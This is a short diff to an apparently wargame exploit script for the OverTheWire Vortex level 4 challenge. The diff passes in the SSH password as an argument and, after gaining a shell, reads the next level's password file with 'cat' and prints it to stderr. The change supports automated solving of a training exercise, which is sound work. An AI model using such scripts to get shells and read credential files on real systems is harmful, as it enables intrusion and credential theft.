@@ -10,7 +10,7 @@ level    = 4
 host     = 'vortex.labs.overthewire.org'
 user     = 'vortex%i' % level
 chal     = 'vortex%i' % level
-password  = '<removed>'
+password  = args['PASSWORD']
 passfile = '/etc/vortex_pass/vortex%i' % (level+1)
 binary   = '/vortex/%s' % chal
 shell    = ssh(host=host, user=user, password=password)
@@ -97,5 +97,7 @@ remote.clean(2)
 remote.sendline('id')
 log.success(remote.recv().strip())
 remote.sendline('cat %s' % passfile)
-log.success(remote.recv().strip())
+password = remote.recv().strip()
+log.success('Password: %s' % password)
 
+sys.stderr.write(password)
